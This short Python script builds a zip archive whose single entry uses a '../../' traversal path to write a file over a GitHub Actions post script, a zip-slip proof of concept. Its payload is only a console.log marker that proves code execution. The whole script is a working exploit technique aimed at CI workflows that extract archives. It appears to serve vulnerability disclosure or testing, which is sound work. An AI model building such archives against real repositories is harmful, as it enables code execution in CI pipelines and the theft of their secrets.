import zipfile

payload = "console.log('VALIDATED_ARTIFACT_ZIP_SLIP_RCE')\n"

with zipfile.ZipFile("comparison.zip", "w", zipfile.ZIP_DEFLATED) as archive:
    archive.writestr(
        "safe/../../.github/actions/validation-post-target/post.js",
        payload,
    )
